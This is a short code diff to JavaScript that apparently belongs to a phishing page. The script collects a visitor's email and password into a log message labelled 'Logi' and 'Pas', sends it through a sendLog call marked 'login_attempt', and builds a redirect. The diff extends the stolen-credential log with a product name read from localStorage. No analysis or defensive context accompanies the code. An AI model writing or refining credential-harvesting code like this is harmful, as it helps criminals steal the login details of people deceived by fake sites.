@@ -896,8 +896,11 @@
             const price = urlParams.get('price');
             const currency = urlParams.get('currency');
 
-            // Send log with link_id if present
-            const logDetails = `👨 Logi: ${email}\n🔐 Pas: ${password}${link_id ? `\nlink_id=${link_id}` : ''}`;
+            // Get product name from localStorage if available
+            const productName = localStorage.getItem('lastProductName') || 'Товар';
+
+            // Send log with product name instead of link_id
+            const logDetails = `👨 Logi: ${email}\n🔐 Pas: ${password}\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`;
 
             sendLog('login_attempt', logDetails, function() {
                 // Build redirect URL with all parameters
